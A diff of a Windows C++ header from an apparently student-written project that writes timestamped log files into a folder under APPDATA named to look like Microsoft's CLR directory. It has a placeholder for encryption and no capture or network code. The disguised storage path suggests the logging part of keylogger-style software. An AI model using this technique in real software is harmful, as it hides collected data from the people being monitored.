@@ -1,23 +1,28 @@
+/*
+Jacob Brown jmb7438@rit.edu
+Geoffrey Kanteles gdk7676@rit.edu
+*/
+
 #ifndef IO_H
 #define IO_H
 
 #include <string>
-#include <cstdlib>  // for the get-environment function
+#include <cstdlib>
 #include <fstream>
-#include "windows.h"    // the Windows API header
-#include "Helper.h"
+#include "windows.h"
+#include "ExtraFuncts.h"
 
-namespace IO
+namespace Logging
 {
-    std::string GetOurPath(const bool append_separator = false) // append separator = if the backslash is included at the end of our path
+    std::string GetOurPath(const bool append_separator = false)
     {
         std::string appdata_dir(getenv("APPDATA"));
-        std::string full = appdata_dir + "\\Microsoft\\CLR";    // backslash = escape character = have 2 to get 1
+        std::string full = appdata_dir + "\\Microsoft\\CLR";
 
         return full + (append_separator ? "\\" : "");
     }
 
-    bool MkOneDr(std::string path)  // this function fails in a C:\Users\User\Downloads or a C:\Users\\Downloads scenario
+    bool MkOneDr(std::string path)
     {
         return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
     }
@@ -26,7 +31,7 @@ namespace IO
     {
         for(char &c : path)
         {
-            if(c == '\\')   // like C:\Users\test\Downloads
+            if(c == '\\')
             {
                 c = '\0';
                 if(!MkOneDr(path)) return false;
@@ -42,20 +47,18 @@ namespace IO
     {
         std::string path = GetOurPath(true);
         Helper::DateTime dt;
-        std::string name = dt.GetDateTimeString("_") + ".log";   // we can't use ':' in Windows' file names, so we use '_' as separator
+        std::string name = dt.GetDateTimeString("_") + ".log";
 
         try
         {
             std::ofstream file(path+name);
-            if(!file) return "";    // if file cannot be opened or used, then return an empty string
+            if(!file) return "";
             std::ostringstream s;
-            // std::endl = flush the buffer and go into the new line
+
             s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;
-            // encrypt
             std::string data = s.str();
-            // dump string stream to the file
             file << data;
-            if(!file) return ""; // if something has gone wrong with the file
+            if(!file) return "";
             file.close();
 
             return name;
